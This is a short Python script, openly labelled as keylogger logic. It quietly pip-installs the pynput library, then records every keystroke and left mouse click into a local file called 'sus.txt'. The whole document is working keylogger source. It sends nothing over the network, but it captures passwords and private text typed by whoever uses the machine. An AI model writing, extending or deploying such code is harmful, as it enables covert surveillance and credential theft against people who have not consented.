# check if libiraries are installed if not install them
import sys
import subprocess
import pkg_resources

required = {'pynput'}
installed = {pkg.key for pkg in pkg_resources.working_set}
missing = required - installed

if missing:
    python = sys.executable
    subprocess.check_call([python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)

# key logger logic
from pynput import keyboard,mouse
from threading import Lock

lock = Lock()
def writeInFile(char):
    lock.acquire()
    try: 
        file = open("sus.txt",'a')
        file.write(char)
    except:
        print("Why r u still here")
    lock.release()

def handleKey(key):
    print(key)
    if(hasattr(key,"char")):
        writeInFile(key.char)
    else:
        writeInFile(str(key))
    
def handleClick(x,y,button,pressed):
    if button == mouse.Button.left and pressed == 0:
        writeInFile("click")
    
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=handleKey)
    listener.start()
    listener2 = mouse.Listener(on_click=handleClick)
    listener2.start()
    input()